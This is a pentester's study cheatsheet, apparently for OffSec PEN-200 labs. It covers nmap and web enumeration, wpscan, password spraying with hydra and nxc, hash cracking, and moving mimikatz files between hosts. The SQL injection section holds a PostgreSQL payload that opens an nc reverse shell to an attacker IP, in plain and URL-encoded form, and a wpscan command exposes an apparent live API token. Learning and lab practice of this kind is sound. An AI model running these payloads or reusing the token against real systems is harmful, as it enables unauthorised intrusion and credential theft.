---
title: "Cheatsheet"
date: 2025-09-03
lastmod: 2025-09-03
tags: [SSH, cheatsheet, Kali, Linux/basics, PWK]
categories: [SSH, Linux, Pentesting, cheatsheet]
author: "James Heringer"
summary: "Cheatsheet"
draft: false
layout: cheatsheet
---

# Cheatsheet
## Recursive code search
```shell
gci *.md -Recurse -file | Select-String -Pattern "curl.*%2e" # powershell
grep -rE 'curl.*%2e' # GREP linux

# CTF file search
Get-ChildItem -Path C:\ -Include flag.txt, proof.txt,local.txt -Recurse -ErrorAction SilentlyContinue

cd c:\Users
tree /F

# KDBX in Windows & Linux
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue  
find / -name *.kdbx 2>/dev/null  
```
## NMAP
- Run first line to enum ports, then second to target found ports
```bash
# ALL ports, search OPEN
sudo nmap -vv --reason -Pn -T4 -p- -oN "./scans/_open_tcp_nmap.txt" 192.168.IP

# Deep Scan on Found Ports 
sudo nmap -vv --reason -Pn -T4 -sV -sC  -p 22,80,443 -oN "./scans/_specific_tcp_nmap.txt" 192.168.IP

# A  utoRecon syntax
sudo nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p 22,80,443 -oN "./scans/_specific_tcp_nmap.txt" 192.168.IP

# Top-Ports All-In-One scan, all checks,  version
sudo nmap -vv --reason -Pn -T4  -sV -sC --version-all -A --osscan-guess  --top-ports 1000  -oN "./scans/_open_tcp_nmap.txt" 192.168.IP

# UDP
sudo nmap -vv --reason -Pn -T4 -sU --top-ports 20 -oN "./scans/_full_tcp_nmap.txt" <IP>  

# -Pn:     WINDOWS, blocking ICMP. Treats the host as always up (since a successful port scan implies the host is reachable).
# -sS:    Perform a stealthy TCP SYN scan, which is often faster and less intrusive than a full TCP connect scan.
# -sV:    Probe the open ports to determine the service and version information running on them.
# -sC:    Runs the default Nmap scripts for enhanced enumeration.
# -oN:    Output normal format deep_scan.txt
# -oG:    Output GREP format deep_scan.txt

# enumerate services, i.e. SSH
ls -1 /usr/share/nmap/scripts/ssh
sudo nmap -p 22 --script ssh-auth-methods 192.168.IP

```

### One Two Punch!
```bash
# MASSCAN needs -e tun0 or it also doesn't work
sudo masscan 192.168.246.189 -p0-65535 --rate 1000 --open-only -e tun0  
sudo masscan 192.168.246.189 --tiop-ports 1000 --rate 1000 --open-only -e tun0
sudo nmap -p 22,25,80 -sV -sC -Pn 10.10.10.5 -oN deep_scan.txt
```
## Wordlists
```bash
/usr/share/wordlists/dirb/common.txt   
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt  # FEROX Default: 
/usr/share/wordlists/dirb/small.txt
/usr/share/wordlists/dirb/big.txt
```

## Web Enumeration
```bash
 # Tech  stack, plugins, cookies
 whatweb http://alvida-eatery.local/ -v    
 whatweb --color=never --no-errors -a 3 -v http://192.168.110.201:80 2>&1 
 
 # banner grab
nmap -vv --reason -Pn -T4 -sV -p 80 --script="banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)"  <IP>

# IF scanning for files, maybe stick with gobuster
gobuster dir  -w /usr/share/wordlists/dirb/common.txt -t 40 -x php,html,txt -u http://

# directory scan, feroxbuster is recursive by default
feroxbuster -u <URL>  -k  # Default wordlist, recursion depth 4, disable TLS/SSL validation
feroxbuster -u <URL> -w /usr/share/wordlists/dirb/common.txt  -k 
feroxbuster -u <URL> -k -x php  --dont-extract-links  --silent 

# 10.3.2 Q4
feroxbuster -u http://alvida-eatery.local/wp-content/plugins/ -k -o fscan.txt --silent -x php  --dont-extract-links  -d 1    
# -k : ignore TLS/SSL  validation
# -s  : status codes to  include
#  --dont-extract-links : when using extension -x, it doesn't work well without this  switch

# Directory and Files Brute Forcing with ffuf
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://vanity.offsec/FUZZ/ 
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-files-lowercase.txt -u http://vanity.offsec/uploads/FUZZ/
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -fw 12 -u http://192.168.50.179:8080/FUZZ/
# -fw 12 : ignore responses with exactly 12 words
# use port 8080

ffuf -c -w win-path.txt -fc 404 -x http://127.0.0.1:8080 -u http://192.168.50.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=FUZZ
# -c  Enables colorized output
# -fc 404 Filters out   (hides) responses with the specified HTTP status **code** (404 - Not Found)
# -x http://127.0.0.1:8080   Specifies an HTTP proxy
# &RESULTPAGE=FUZZ  the placeholder for the wordlist entries

#  meta files
curl -s -i http://vanity.offsec/robots.txt 
curl -s -i http://vanity.offsec/sitemap.xml

curl -sSikf http://192.168.110.201:80/robots.txt
curl -sSik http://192.168.110.201:80/
# -s : silent  # -i  include headers

```
### FFUF
- We can  use  FFUF to simulate sqlmap or other automated commands
- In post file, replace variable input with FUZZ. If  input of user was 'admin', you change it to 'FUZZ'
- Capture POST request to file in Burp, then feed it t o FFUF
```bash
# IPSEC  example : https://youtu.be/HqIUffFdjuI?t=296
ffuf -request myrequest.req -request-proto http -w /opt/seclists/Fuzzing/special-chars.txt -fs -mc all
#  -fs  : filter size, to remove the common error  and look for unique output 
#  -mc   : match everything
```
### Temp Web Paths
* APACHE 
    * `/var/www/html/tmp/`   - access at wbesite root/tmp/ 
* NGINX 
    * `/var/www/html` - access at root of website 

### API Identify
* Identifying endpoints with pattern match
* pattern goes in pattern file
```bash
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern 
# pattern, file contents
{GOBUSTER}/v1
{GOBUSTER}/v2
```

## WPSCAN 
```bash
# # vp,vt (Vulnerable Plugins, Themes)	
wpscan --url <TARGET_URL> --api-token <YOUR_API_TOKEN> -e vp,vt  -v -o <FILE_PATH>

# 10.3.2 LAB
wpscan --url http://alvida-eatery.local/  --enumerate vp,u,vt,tt --verbose -o target.log  --api-token   XmZXN8uqKwC7Mgk0PyisC6EUqAexnxteBjkxZssNCuY  
# AutoRecon suggested syntax.. add api

wpscan --url http://<IP> --no-update -e vp,vt,tt,cb,dbe,u,m --plugins-detection aggressive --plugins-version-detection aggressive -f cli-no-color 2>&1 | tee "./scans/tcp80/tcp_80_http_wpscan.txt"

# Longer - users, all plugins, all themes
wpscan --url <TARGET_URL> --api-token <YOUR_API_TOKEN> -e vp,vt,u,ap,at

#Accessing Wordpress shell
http://<IP>/retro/wp-admin/theme-editor.php?file=404.php&theme=90s-retro
http://<IP>/retro/wp-content/themes/90s-retro/404.php
```


## Ping Sweep
```bash
#### taken from John Hammond - How To Pivot Through a Network with Chisel, https://www.youtube.com/watch?v=pbR_BNSOaMk&t=1878s
# linux 
for i in $(seq 254); do ping 1.1.1.${i} -c1 -W1 & done | grep from

# Windows 
1..254 | ForEach-Object -Parallel {
    if (Test-Connection -TargetName "192.168.1.$_" -Count 1 -Quiet -TimeoutSeconds 1) {
        Write-Host "Host 192.168.1.$_ is up." -ForegroundColor Green
    }
}
```
## RLWRAP
* rlwrap is a wrapper program that adds the features  to programs that don't natively have them
* NCAT, upgraded NC version, supports reconnect, SSL
```bash
rlwrap ncat -nvlp <port>
rlwrap --prompt-colour=red --complete-filenames --ansi-colour-aware --history-no-dupes 2 --logfile <logfile> --remember ncat -nvlp <port>
```
## SQLi
### PostGress
```shell
# Use for RevShell SQLi, add leading single quote ' - CHP 10, Q6, Blind SQL 
 ; DROP TABLE IF EXISTS commandexec ; CREATE TABLE commandexec(data text) ; COPY commandexec FROM PROGRAM '/usr/bin/nc.traditional -e /bin/sh 192.168.45.245 443' ; -- 

 # Optionally URL encode with Burp, height was entry point for this SQLi
  weight=1&height='%3bDROP+TABLE+IF+EXISTS+commandexec%3bCREATE+TABLE+commandexec(data+text)%3bCOPY+commandexec+FROM+PROGRAM+'/usr/bin/nc.traditional+-e+/bin/sh+192.168.45.241+4444'%3b--&age=24&gender=Male&email=test%40offsec.com  
```
- Resources
- https://pentestmonkey.net/category/cheat-sheet/sql-injection 
- https://www.advania.co.uk/blog/security/mysql-sql-injection-practical-cheat-sheet/
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
- https://portswigger.net/web-security/sql-injection/cheat-sheet 
- https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mysql.html 
## RDP
```bash
# Connect with a mapped network drive!!!!
xfreerdp3/drive:KALI_PWK,/home/kali/pwk   /u:user  /p:'Pass' /v:192.168.IP  

# try switches /auto-reconnect /compression /size:90%
xfreerdp3 /drive:KALI_PWK,/home/kali/Documents/pwk  /cert:ignore /auto-reconnect-max-retries:3 /size:90% /u:user  /p:'Pass' /v:192.168.IP  

# RDP password spraying with custom user list, nxc is supposed to be better for RDP 
nxc rdp 192.168.110.227 -u 'nadine' -p "$rockyou" --ignore-pw-decoding

hydra -L users.txt -p "SuperS3cure1337#" rdp://192.168.168.202  

# Other various connection options
sudo rdesktop -u USERNAME -p PASSWORD -g 90% -r disk:local="/home/kali/Desktop/" IP-ADDRESS
rdesktop -u USERNAME -p PASSWORD -a 16 -P -z -b -g 1280x860 IP_ADDRESS
```

## FTP
```bash
# FTP password spraying with custom user list
hydra -l 'itadmin' -P ~/pwk/rockyou.txt ftp://192.168.168.202  
nxc ftp  <IP> -u user  -p 'pass' --ls     # list directory contents
nxc ftp  <IP> -u user  -p 'pass' --get flag.txt  # get file named flag.txt
```
## Password Cracking
- Identify users that can read shadow `grep 'shadow' /etc/group `
- Output hash to file `echo '$6$4kpaRzOQ$mMa/' > roothash.txt`
### John
```bash
john roothash2.txt --wordlist=$rockyou  
john roothash2.txt --show  

# If needed, combine passwd + shadow into single file
sudo unshadow /etc/passwd /etc/shadow > my_hashes.txt
```
### Hashcat
* [Hashcat Rules](https://hashcat.net/wiki/doku.php?id=rule_based_attack)
* [Hashcat MODE ID](https://hashcat.net/wiki/doku.php?id=example_hashes)
```bash
# Sha512-crypt $6$
hashcat -m 1800 -a 0  roothash.txt $rockyou --force -o cracked

# show password, with mode of hash
hashcat -m  0 hash.txt --show    

# use rule to Mutate wordlist for passord policy and crack  MD5
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r demo.rule --force

# identify hashes 
hash-identifier '056df33e47082c77148dba529212d50a'   

# uppercase.rule is 
u 
# then run hashcate against uppercase.rule
hashcat -a 0 -m <mode> <hashfile> <wordlist> -r uppercase.rule

```
## Windows to Kali File Transfer
### SMB 

```bash
# On Kali:
impacket-smbserver test . -smb2support  -username kourosh -password kourosh
# On Windows:
net use m: \\Kali_IP\test /user:kourosh kourosh
copy mimikatz.log m:\
```

### RDP mounting shared folder:

```bash
# Kali:
xfreerdp /cert-ignore /compression /auto-reconnect /u:
offsec /p:lab /v:192.168.212.250 /w:1600 /h:800 /drive:test,/home/kali/Documents/pen-
200

# windows:
copy mimikatz.log \\tsclient\test\mimikatz.log

# rdesktop:
# Kali: 
rdesktop -z -P -x m -u offsec -p lab 192.168.212.250 -r disk:test=/home/kali/Documents/pen-200

#  Windows:
copy mimikatz.log \\tsclient\test\mimikatz.log
```

### Impacket

```powershell
# psexec and wmiexec are shipped with built in feature for file transfer.
# Note: By default whether you upload (lput) or download (lget) a file, it'll be written in C:\Windows path.
# Uploading mimikatz.exe to the target machine:
C:\Windows\system32> lput mimikatz.exe
[*] Uploading mimikatz.exe to ADMIN$\/
C:\Windows\system32> cd C:\windows
C:\Windows> dir /b mimikatz.exe
mimikatz.exe

# Downloading mimikatz.log:
C:\Windows> lget mimikatz.log
[*] Downloading ADMIN$\mimikatz.log
```
### Evil-winrm
```powershell
# Uploading files:
upload mimikatz.exe C:\windows\tasks\mimikatz.exe
# Downloading files:
download mimikatz.log /home/kali/Documents/pen-200
```

###  C2 frameworks:
-  Almost any of the C2 frameworks such as Metasploit are shipped with downloading and uploading functionality.
- In FTP, binaries in ASCII mode will make the file not executable. Set the mode to binary.
- Additional Resources:
- File Transfer:  https://www.youtube.com/watch?v=kd0sZWI6Blc
- PEN-100: https://portal.offsec.com/learning-paths/network-penetration-testing-essentials-pen-100/books-and-videos/modal/modules/file-transfers
